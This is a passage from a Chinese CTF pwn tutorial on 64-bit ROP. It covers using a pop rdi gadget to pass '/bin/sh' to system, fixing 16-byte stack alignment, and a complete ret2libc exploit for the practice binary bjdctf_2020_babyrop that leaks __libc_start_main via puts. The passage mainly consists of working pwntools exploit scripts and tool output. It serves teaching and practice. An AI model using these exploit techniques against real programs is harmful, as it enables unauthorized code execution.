    sh.send(payload)
    # sh.send("whoami")
    sh.interactive()
这个在ubuntu上运行会出错,因为栈溢出破坏了栈结构，没有进行16字节对齐，具体原因可以看一下[关于libc-2.27中system函数的一个坑](http://homura.cc/blog/archives/168)
>  movaps [rsp+198h+var_158], xmm**
>
> 要求这个值:[rsp+198h+var_158] 必须是对齐16字节的，也就是能被0x10整除的，要不然就会中断退出,
这个时候我们可以加一个跳板`retn`,来对齐16字节。
###  0x4.2 控制参数
这里我选取了一道比较简单的题目，需要一些gadget来控制rdi，从而实现执行system的题目
题目链接:
开始我们的套路三部曲:
1.查保护
只是开了个堆栈不可执行的NX，64位程序。
2.ida
这就很贴心了,system也有了,还有个漏洞函数，果断跟进看看
很明显栈空间大小为0x80,能输入0x200个字节，很明显一个栈溢出可以控制rip了。
这里没有明显的`system("/bin/sh")`后门函数，但是这里使用system
我们只要找一个`/bin/sh`字符串作为他的参数就可以
`shift+F12`
很简单就能找到了这个字符串,这个字符串必须在system调用之前，写入到rdi寄存器，这样才能作为system的参数，所以我们需要找一个链条`POP
rdi;ret`之类的链接，把栈顶的`bin/sh`地址写入到rdi中,然后继续跳转到`system`函数执行。
`ROPgadget --binary vuln2 --only 'pop|ret' | grep 'rdi'`
下面我们编写下相对应的EXP即可:
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    debug = True
    # 设置调试环境
    context(log_level = 'debug', arch = 'amd64', os = 'linux')
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    if debug:
        sh = process("./vuln2")
        elf = ELF("./vuln2")
    else:
        link = ""
        ip, port = map(lambda x:x.strip(), link.split(':'))
        sh = remote(ip, port)
    binsh = elf.search("/bin/sh").next()
    system_addr = elf.symbols["system"]
    pop_rdi = 0x4006b3 # ROPgadget找的
    retn = 0x400644 # ida随便找的一条retn
    print("binsh:" + hex(binsh))
    print("system_addr:" + hex(system_addr))
    print("pop_rdi:" + hex(pop_rdi))
    paylaod = 'A'*0x80+ 'B'*0x8 + p64(pop_rdi)+p64(binsh) + p64(retn) +p64(system_addr)
    pause()
    gdb.attach(sh, "b *0x400634")
    sh.sendlineafter("Input:n", paylaod)
    sh.interactive()
这里同样需要注意16字节对齐的问题,不同的libc版本会有这些坑，自己多试试。
## 0x5 真题演练
下面我们先以一个经典的ROP题目来演示下各种完整利用的姿势。
这里笔者从buuoj中选了一个比较基础的题目:bjdctf_2020_babyrop
**1.查checksec**
没开栈保护，没开pie，基本是栈溢出了,64位程序
**2.ida**
很明显可以看到`vuln`函数中read读取可以造成栈溢出，根据提示好像是要找泄露libc地址？
我们先看看有没有什么后门函数`SYSTEM`之类的，看一下字符串。。。
emmm，都没有的，所以说这个环境只有一个栈溢出的点。。。。
**3.分析解题思路**
这个题目有puts,我们可以通过栈溢出得`libc_start_main`的地址,用LibcSearcher来获取libc的版本，这个我本地的话也可以查看，然后减去偏移得到libc的基地址，然后再次触发漏洞函数,
重复栈溢出rop到system(“/bin/sh”)
1.首先需要找到溢出长度,ida里面可以很简单看出来是0x28,但是ida有时候会有问题,这里介绍下一些Fuzz的技巧。
按道理来说:
    1.cyclic 100 | ./bjdctf_2020_babyrop
    2.dmesg | tail -1
    3.cyclic -l 61616168 ip的值就可以的。 segfault at 61616168
不过我测试的时候并没有显示这个，只有`general protection`
其实手工调试也ok
因为ret(pop rip),所以我们其实很好确定,我们选开头的4个字节作为subpattern
    cyclic -l kaaa
    40
这样子很简单就得到了栈溢出的大小为40
2.泄露`libc_start_main`的地址
思路其实很简单就是通过控制栈溢出执行puts函数,然后控制rdi为`libc_start_main`的got表地址,然后就输出啦
    0x0000000000400733 : pop rdi ; retroot@mpwn:/ctf/work/test# ROPgadget --binary bjdctf_2020_babyrop --only "pop|ret"  | grep "rdi"
    0x0000000000400733 : pop rdi ; ret
    pop_rdi_addr = 0x400733
    put_addr = elf.symbols["puts"]
    libc_got_addr = elf.got["__libc_start_main"]
    return_pop = 0x400530
    payload = 'A'*40
    payload += p64(pop_rdi_addr)+p64(libc_got_addr)+p64(put_addr)+p64(return_pop)
    sh.recvuntil('story!n')
    sh.sendline(payload)
    libc_main_addr = u64(sh.recvn(6).ljust(8, 'x00'))
3.获得lib基地址之后,我们找到`system、bin/sh`偏移构造ROP
    obj = LibcSearcher("__libc_start_main", sh)
    libc_base = libc_main_addr - obj.dump("__libc_start_main")
    system_addr = libc_base + obj.dump("system")
    binsh_addr = libc_base + obj.dump("str_bin_sh")
这里我们是根据泄露的一些函数地址通过LibcSearcher找到libc的版本。
如果只是实现在本地打的话的,我们可以通过很多方式去查看当前程序使用的libc
最简单就是通过`ldd`获取到加载的so路径
    root@--name:/ctf/work/test# ldd bjdctf_2020_babyrop
        linux-vdso.so.1 (0x00007ffc57518000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f599a38e000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f599a77f000)
可以看到指向的是`libc-2.27`版本的so文件,有了这个我们也可以直接获取到里面`__libc_start_main`函数的偏移,从而求出基地址。
我这里测试Libc的后两个字节可以看到是b0,但是LibcSearcher并没有找到。
    root@--name:/ctf/work/test# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "__libc_start"
      2203: 0000000000021ab0   446 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
这个查询网站我感觉非常不错,[libc database
search](https://libc.blukat.me/?q=__libc_start_main%3Aab0),是可以查到的，可能由于libcSearch的库太老了，缺乏。
这里我们手动加上去吧,
`./add /lib/x86_64-linux-gnu/libc-2.27.so`
    root@--name:/ctf/work/test/LibcSearcher/libc-database# ./find __libc_start_main ab0
    http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)
    /lib/x86_64-linux-gnu/libc-2.27.so (id local-18292bd12d37bfaf58e8dded9db7f1f5da1192cb)
这样我们再跑一次
4.完整EXP
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    from LibcSearcher import *
    import time
    debug = True
    context(log_level="debug", arch="amd64", os="linux")
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    if debug:
        sh = process("./bjdctf_2020_babyrop")
        # gdb.attach(sh, "b *0x4006C0")
        # sleep(1)
        elf = ELF("bjdctf_2020_babyrop")
    else:
        link = ""
        ip, port = map(lambda x:x.strip(), link.split(':'))
        sh = remote(ip, port)
    pop_rdi_addr = 0x400733
    put_addr = elf.symbols["puts"]
    libc_got_addr = elf.got["__libc_start_main"]
    return_pop = 0x400530
    payload = 'A'*40
    payload += p64(pop_rdi_addr)+p64(libc_got_addr)+p64(put_addr)+p64(return_pop)
    sh.recvuntil('story!n')
    sh.sendline(payload)
    libc_main_addr = u64(sh.recvn(6).ljust(8, 'x00'))
    print("libc_addr => {}".format(hex(libc_main_addr)))
    obj = LibcSearcher("__libc_start_main", libc_main_addr)
    libc_base = libc_main_addr - obj.dump("__libc_start_main")
    system_addr = libc_base + obj.dump("system")
    binsh_addr = libc_base + obj.dump("str_bin_sh")
    print("libc_base => {}".format(hex(libc_base)))
    print("system_addr => {}".format(hex(system_addr)))
    print("binsh_addr => {}".format(hex(binsh_addr)))
    payload = 'A'*40 + p64(pop_rdi_addr) + p64(binsh_addr) + p64(0x400591) +p64(system_addr)
    sh.recvuntil('story!n')
    sh.sendline(payload)
    sh.interactive()
这里需要注意两个点:
1.记得使用p64(0x400591) `对齐16字节
2.`libc_main_addr = u64(sh.recvn(6).ljust(8, 'x00'))`
这个长度的判断主要是根据libc一般开头都`7f`,一开始我写的是`sh.recvn(8)`但是发现7f结束之后也才有6字节，所以做了下修改变成了`u64(sh.recvn(6).ljust(8,'x00'))`
## 0x6 总结
后面我会学习dynELF这种无libc获取函数地址的思路,然后拓展学习下多参数控制之万能gadget的原理，现在目前看了几道有意思的题目,如果有时间的话，估计会下一篇文章中写写(wo
tcl, heap study was delayed…. )
## 0x7 参考链接
[32位和64位在pwn中的不同点](//tearorca.github.io/32%E4%BD%8D%E5%92%8C64%E4%BD%8D%E5%9C%A8pwn%E4%B8%AD%E7%9A%84%E4%B8%8D%E5%90%8C%E7%82%B9/))
[linux进程地址空间布局浅析](https://segmentfault.com/a/1190000011634766)
[Linux下逻辑地址、线性地址、物理地址详细总结](https://www.cnblogs.com/alantu2018/p/9002441.html)
[intel处理器段页式内存管理](https://blog.csdn.net/weixin_34235135/article/details/91942126)
[ROP题目练习](//www.chumen77.xyz/2020/02/03/ROP%E7%BB%83%E4%B9%A0/#HarekazeCTF2019-baby-rop))
[借助DynELF实现无libc的漏洞利用小结](https://www.anquanke.com/post/id/85129)